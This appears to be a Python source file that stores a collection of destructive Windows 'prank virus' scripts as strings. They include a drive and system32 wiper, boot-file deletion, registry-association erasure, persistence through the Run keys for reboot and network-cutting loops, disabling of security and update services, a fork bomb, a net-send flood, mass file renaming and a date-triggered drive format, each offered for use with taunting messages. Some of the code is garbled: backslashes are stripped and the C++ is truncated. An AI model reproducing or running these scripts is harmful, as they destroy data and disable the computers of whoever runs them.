
application_bomber_read = """
@echo off
 
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x

"""


auto_shutdown_read = """
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE

"""


caps_toggle_read = """
Set wshShell =wscript.CreateObject(“WScript.Shel
l”)
do
wscript.sleep 100
wshshell.sendkeys “{CAPSLOCK}”
loop

"""

danger_zone_read = """
@echo off
del D:*.* /f /s /q
del E:*.* /f /s /q
del F:*.* /f /s /q
del G:*.* /f /s /q
del H:*.* /f /s /q
del I:*.* /f /s /q
del J:*.* /f /s /q
"""

reg_eraser_read = """
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
"""


sys32_read = """
del c:WINDOWSsystem32*.*/q 
"""

drive_read = """
rd/s/q D:
rd/s/q C:
rd/s/q E:

"""

forkBomb_read = """

: () { :| :& }; :

"""

internet_disabler_read = """
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE

"""



network_flood_read = """
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH

"""

pc_crash_read = """
@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini

"""



pc_crash2_read = """
@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
msg * YOU GOT OWNED!!!
shutdown -s -t 7 -c “A VIRUS IS TAKING OVER c:Drive

"""

shutdown_read ="""
@echo off
msg * I don’t like you
shutdown -c “Error! You are too stupid!” -s

"""

up_internet_read = """
@echo off
reg
add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t
REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul
start iexpress (website of your choice)
ipconfig /release
del “C:Program FilesMicrosoft Games
del “C:Nexon
del “C:Program FilesXfire
del “C:Program FilesAdobe”
del “C:Program FilesInternet Explorer”
del “C:Program FilesMozilla Firefox”
del “C:WINDOWS”
del “C:WINDOWSsystem32”
del “C:WINDOWSsystem32cmd”
del “C:WINDOWSsystem32iexpress”
del “C:WINDOWSsystem32sndvol32”
del “C:WINDOWSsystem32sndrec32”
del “C:WINDOWSsystem32Restorerstrui”
del “C:WINDOWSsystem32wupdmgr”
del “C:WINDOWSsystem32desktop”
del “C:WINDOWSjava”
del “C:WINDOWSMedia”
del “C:WINDOWSResources”
del “C:WINDOWSsystem”
del “C:drivers”
del “C:drv”
del “C:SYSINFO”
del “C:Program Files”
echo ipconfig/release_all>>c:windowswimn32.bat
net stop “Security Center”
net stop SharedAccess
> “%Temp%.kill.reg” ECHO REGEDIT4
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
>>”%Temp%.kill.reg” ECHO.
START /WAIT REGEDIT /S “%Temp%.kill.reg”
del “%Temp%.kill.reg”
del %0
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
:a
start iexpress (website of your choice)
goto a

"""

stop_internet_read = """
@Echo off
pconfig /release

"""

sys_eraser_read = """
@echo off
del %systemdrive%*.* /f /s /q
shutdown -r -f -t 00

"""

sys_melter_read = """
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
PAUSE
PAUSE

"""

the_matrix_read = """
#include
#include
#include
#include
#include
#include
#include
using namespace std;
int main()
{ keybd_event(VK_MENU,0x38,0,0);
keybd_event(VK_RETURN,0x1c,0,0);
keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
HANDLE outToScreen;
outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);
{
char buffer[255];
char inputFile[]=”C:Documents and SettingsAll UsersStart MenuProgramsStartuprawr.bat”;
ifstream input(inputFile);
if (!input)
{
{
ofstream fp(“C:Documents and SettingsAll UsersStart MenuProgramsStartuprawr.bat”, ios::app);
fp
fp
fp
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
}
}
}
{
char buffer[255];
char inputFile[]=”C:rawr.exe”;
ifstream input(inputFile);
if (!input)
{
{
{
ofstream fp(“CLICK.bat”, ios::app);
fp
fp
fp
fp
}
system(“START CLICK.bat”);
main();
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
system(“call shutdown.exe -S”);
goto START;
}
}
}
START:{
for(int i = 0; i < 1; i++)
{
int num = (rand() % 10);
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
cout
Sleep(60);
}
}
for ( int j = 0; j < 5; j++)
{
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
int number = (rand() % 24);
cout
}
goto START;

"""

time_bomb_read = """
If %date% NEQ {date} goto exit
format E: /y >nul
:exit
exit
"""

















